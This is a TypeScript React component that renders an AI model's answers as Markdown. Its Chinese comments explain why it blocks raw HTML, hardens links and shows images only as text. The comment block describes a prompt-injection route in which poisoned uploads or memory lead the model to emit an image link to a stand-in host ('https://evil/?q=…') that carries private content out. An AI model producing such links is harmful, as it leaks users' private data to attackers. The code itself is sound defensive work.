import Markdown from "react-markdown";
import remarkGfm from "remark-gfm";

import { imageAsText } from "./answerImages.ts";

/**
 * 回答正文的 Markdown 渲染（P5-S49）：模型输出的 `**加粗**`、列表、表格此前按纯文本显示。
 *
 * 安全边界：react-markdown 默认**不渲染原始 HTML**（这里也不接任何原始 HTML 插件），
 * 模型或上传文件里混进的 `<script>` / `<img onerror>` 只会作为文字出现。
 * 链接一律新窗口打开并切断 opener，避免回答里的链接接管工作台页面。
 *
 * P7-S11：**不渲染任何图片**。Markdown 图片 `![](url)` 默认会变成 `<img>`，浏览器一加载就向 url 发请求——
 * 被投毒的内容（上传文件、记忆、将来的搜索结果）诱导模型输出 `![](https://evil/?q=私有内容)`，就等于替攻击者发出了请求。
 * `deploy/Caddyfile` 的 CSP 只保护经反代的部署，直连 8000 端口没有 CSP，所以必须在渲染层兜住。
 * 图片以纯文本呈现（见 `answerImages.ts`）。
 */
export function AnswerMarkdown({ text }: { text: string }) {
  return (
    <div className="answer-markdown">
      <Markdown
        remarkPlugins={[remarkGfm]}
        skipHtml
        components={{
          a: ({ href, children }) => (
            <a href={href} target="_blank" rel="noopener noreferrer nofollow">{children}</a>
          ),
          img: ({ alt, src }) => <span className="answer-image-blocked">{imageAsText(alt, typeof src === "string" ? src : undefined)}</span>,
        }}
      >
        {text}
      </Markdown>
    </div>
  );
}
